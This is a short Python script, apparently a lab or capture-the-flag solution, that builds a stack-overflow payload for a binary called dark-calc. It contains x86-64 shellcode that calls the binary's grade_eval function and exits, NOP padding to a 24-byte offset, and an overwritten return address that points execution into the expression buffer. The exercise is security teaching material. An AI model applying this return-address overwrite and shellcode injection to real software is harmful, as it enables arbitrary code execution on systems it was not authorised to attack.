#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

# grade_eval 的函数入口地址
GRADE_EVAL = 0x401a87

# expression 缓冲区的固定地址
BUFFER_ADDR = 0x721000800fd0

# 从 expression 到返回地址的偏移
OFFSET = 24

# 21 字节机器码
code = bytes.fromhex(
    "48 83 ec 30 6a 04 5f "
    "b8 87 1a 40 00 "
    "ff d0 "
    "31 ff "
    "6a 3c 58 0f 05"
)

# 用 NOP 补齐至 24 字节
payload = code.ljust(OFFSET, b"\x90")

# 覆盖返回地址，使 RIP 跳转到 expression
payload += struct.pack("<Q", BUFFER_ADDR)

sys.stdout.buffer.write(payload)
